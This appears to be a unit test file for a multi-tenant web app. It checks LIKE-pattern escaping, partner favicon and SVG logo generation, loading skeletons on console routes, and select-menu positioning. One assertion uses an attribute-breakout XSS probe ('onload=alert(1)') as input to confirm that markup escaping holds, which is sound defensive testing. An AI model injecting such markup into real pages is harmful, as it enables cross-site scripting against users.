equal(escapeLike("ops@partner.com"), "ops@partner.com", "an ordinary address passes through unchanged");
equal(escapeLike("%@partner.com"), "\\%@partner.com", "% is escaped");
equal(escapeLike("a_b@partner.com"), "a\\_b@partner.com", "_ is escaped");
equal(escapeLike("a%b_c"), "a\\%b\\_c", "every wildcard in one string is escaped");
// The backslash must be escaped FIRST, or escaping % would emit a backslash
// that the next replacement consumes, re-opening the hole.
equal(escapeLike("a\\%b"), "a\\\\\\%b", "a literal backslash is escaped before the wildcards");

// ---------------------------------------------------------------------------
describe("partner tab icon: their own artwork, never Prime's cube");
// ---------------------------------------------------------------------------
/*
  The client asked for a partner's own logo in the browser tab. An earlier
  version discarded any logo wider than 1.6:1 and drew a coloured letter
  instead, reasoning that a wide wordmark squashed into a square is
  unreadable. The squashing is real; the conclusion was not. Fitting the image
  to the square instead of stretching it keeps the logo intact.

  Measured against the live tenants, EVERY partner holding a logo was past
  that threshold, including one at 1.81 that is nearly square, so the feature
  shipped as "every partner gets a letter" while their artwork went unused.
  These assertions pin the corrected rule: artwork wins whenever it exists.
*/

{
  // The shape that used to be rejected. 2890x358 is a real tenant's lockup.
  const icon = partnerIcon({ logo: { path: "t/wide.png", width: 2890, height: 358 } }, "Acme");
  equal(icon.kind, "logo", "a wide wordmark still uses the partner's own artwork");
  if (icon.kind === "logo") {
    equal(icon.path, "t/wide.png", "the uploaded path is passed through");
    equal(icon.width, 2890, "intrinsic width travels with it, for letterboxing");
  }
}

{
  const icon = partnerIcon({ logo: { path: "t/sq.png", width: 512, height: 512 } }, "Acme");
  equal(icon.kind, "logo", "square artwork is used, as before");
}

{
  // 1.81, the near-square case the old threshold also threw away.
  const icon = partnerIcon({ logo: { path: "t/abs.png", width: 2161, height: 1196 } }, "ABS");
  equal(icon.kind, "logo", "a near-square logo is no longer discarded");
}

{
  // Tall artwork is letterboxed on the other axis, not rejected.
  const icon = partnerIcon({ logo: { path: "t/tall.png", width: 200, height: 900 } }, "Acme");
  equal(icon.kind, "logo", "tall artwork is used too");
}

{
  // The genuine fallback: a partner who has uploaded nothing. Several are.
  const icon = partnerIcon({ companyName: "Zenith Group" }, "zenith");
  equal(icon.kind, "letter", "no logo at all still falls back to a tile");
  if (icon.kind === "letter") {
    equal(icon.letter, "Z", "the display name wins over the slug");
    equal(icon.accent, "#ff2d00", "no accent set falls back to the house orange");
  }
}

{
  // Zero dimensions mean the record is unusable, so the tile is correct.
  const icon = partnerIcon({ logo: { path: "t/x.png", width: 0, height: 0 } }, "Acme");
  equal(icon.kind, "letter", "a logo with no dimensions cannot be letterboxed");
}

{
  const icon = partnerIcon({ companyName: "Acme", colors: { accent: "#8535d4" } }, "acme");
  if (icon.kind === "letter") equal(icon.accent, "#8535d4", "the partner's own accent tints the tile");
}

/*
  "meet" is what letterboxes: it scales until the whole image fits and centres
  it, leaving transparent bands. "slice" fills the square and crops. A
  wordmark must never be sliced, because cropping cuts off half the name.
*/
const DATA_URI = "data:image/png;base64,iVBORw0KGgo=";
ok(logoIconSvg(DATA_URI, 2890, 358).includes("xMidYMid meet"),
   "a wide lockup is fitted whole, not cropped");
ok(logoIconSvg(DATA_URI, 512, 512).includes("xMidYMid slice"),
   "square artwork fills the square instead of shrinking inside it");
ok(logoIconSvg(DATA_URI, 2890, 358).includes("viewBox=\"0 0 64 64\""),
   "the wrapper is square whatever the source shape");
/*
  The bytes must be embedded, not linked. An SVG loaded as an image (which is
  what a favicon is) runs in a restricted mode that refuses external
  resources, so a wrapper pointing at the Storage URL rendered as Chrome's
  broken-image glyph. Verified in a browser before this was changed.
*/
ok(logoIconSvg(DATA_URI, 100, 100).includes("data:image/png;base64,"),
   "the logo is inlined, because a referenced SVG cannot load external images");

equal(iconLetter("  acme brokers"), "A", "leading whitespace is skipped");
equal(iconLetter("3M Partners"), "3", "a digit is a valid initial");
equal(iconLetter("!!!"), "?", "punctuation-only names still produce a tile");
equal(iconLetter("\u00e9clair"), "\u00c9", "an accented initial is uppercased, not dropped");

// Both builders interpolate into markup, so both escape their inputs.
ok(!letterTileSvg("<", "#ff2d00").includes("><"), "a bare < is escaped in the tile");
ok(letterTileSvg("A", "#ff2d00").includes("#ff2d00"), "the accent reaches the tile fill");
ok(!logoIconSvg('x"onload="alert(1)', 10, 10).includes('"onload="'),
   "a quote in the data URI cannot break out of the attribute");

// The house must keep app/favicon.ico, which carries seven sizes. Returning
// an explicit icon here would override it with a single one.
equal(tenantIcons({ isHouse: true }), undefined, "the house keeps its own multi-size .ico");
equal(tenantIcons(null), undefined, "an unresolved host does not get a partner icon");
ok(tenantIcons({ isHouse: false })?.icon[0]?.url === "/partner-icon",
   "a partner points at the per-tenant icon route");
/*
  Next injects app/favicon.ico into every route's head, first and tagged
  256x256, and it cannot be suppressed per route. Without sizes="any" a
  browser ranking by declared size would pick Prime's cube on a partner's own
  domain. This assertion is the regression guard for that leak.
*/
equal(tenantIcons({ isHouse: false })?.icon[0]?.sizes, "any",
      "the partner icon outranks the auto-injected house .ico");

// ---------------------------------------------------------------------------
describe("console navigation: no route lands on a frozen screen");
// ---------------------------------------------------------------------------
/*
  Every console route is a server component that authenticates and queries
  before it can render anything. Without a loading.tsx, Next blocks on that
  work and the PREVIOUS page stays on screen, motionless, until it finishes.
  That gap is what the client reported as the app feeling stuttery and laggy.

  Partners was the route missing one, and it is the slowest of the three
  because it issues a lead count per partner. This asserts the whole set, so
  a new console route cannot ship without its skeleton.
*/
{
  const routes = ["app/console", "app/console/team", "app/console/partners", "app/console/leads/[id]"];
  for (const dir of routes) {
    ok(existsSync(`${dir}/loading.tsx`),
       `${dir} ships a loading.tsx (without one, navigating to it freezes the previous page)`);
  }
}

// ---------------------------------------------------------------------------
describe("select menus open below their trigger");
// ---------------------------------------------------------------------------
/*
  Radix defaults Select to position="item-aligned", which slides the list so
  the SELECTED item lands on top of the trigger. On a filter whose current
  value sits near the end of the list, that puts the menu above the control
  and covers it: the thing you just clicked disappears.

  shadcn ships that default, so a future `shadcn add select` would quietly
  reintroduce it. This asserts the source, because the behaviour is a prop
  value rather than anything a unit test can render.
*/
{
  const src = readFileSync("app/components/ui/select.tsx", "utf8");
  ok(src.includes('position = "popper"'),
     'SelectContent defaults to popper, not item-aligned (item-aligned covers the trigger)');
  ok(src.includes('side = "bottom"'),
     "SelectContent asks for below the trigger (Radix still flips up when there is no room)");
  ok(!/h-\[var\(--radix-select-trigger-height\)\]/.test(src),
     "the viewport is not pinned to one row's height, which would make a long list a single-line scroller");
}

done("test-unit");
